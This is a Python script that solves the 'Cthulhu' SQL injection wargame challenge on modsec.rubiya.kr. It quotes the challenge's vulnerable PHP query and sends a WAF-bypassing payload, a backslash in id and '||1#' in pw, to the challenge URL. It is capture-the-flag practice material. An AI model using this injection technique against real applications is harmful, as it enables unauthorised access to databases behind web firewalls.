#!/usr/bin/env python3
import los
import los_cookies as lc


def main():
    """
    Cthulhu 33

    modsec.rubiya.kr server is running ModSecurity Core Rule Set v3.1.0
    with paranoia level 1(default).
    It is the latest version now.(2019.05)
    Can you bypass the WAF?

    if(preg_match('/prob|_|\.|\(\)|admin/i', $_GET[id])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\.|\(\)|admin/i', $_GET[pw])) exit("No Hack ~_~");
    $query = "select id from prob_cthulhu where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']) solve("cthulhu");
    """

    url = "https://modsec.rubiya.kr/chall/cthulhu_c26ae41c4af4c2d7b21c19cbb9009604.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'
    other_param = {'id': '\\'}

    payload = '||1#'
    p = los.SqlInjection(url, cook, method, inj_param, payload, other_param=other_param)
    response = p.my_request()
    if 'Clear!' in response:
        print('\nCthulhu Clear!')


if __name__ == '__main__':
    main()
